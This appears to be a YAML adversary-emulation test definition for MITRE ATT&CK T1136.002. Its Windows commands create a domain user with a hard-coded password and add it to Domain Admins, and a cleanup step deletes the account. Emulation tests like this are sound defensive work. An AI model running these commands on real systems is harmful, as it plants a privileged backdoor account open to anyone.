- id: e7ab5523-3a91-5fbe-9a52-16b292d57bbf
  name: Soumaia ART Tests - Create a new Windows domain admin user
  description: Creates a new domain admin user in a command prompt.
  tactic: persistence
  technique:
    attack_id: T1136.002
    name: 'Create Account: Domain Account'
  platforms:
    windows:
      cmd:
        command: |-
          net user "T1136.002_Admin" "T1136_pass123!" /add /domain
          net group "Domain Admins" "T1136.002_Admin" /add /domain
        cleanup: |-
          net user "T1136.002_Admin" >nul 2>&1 /del /domain
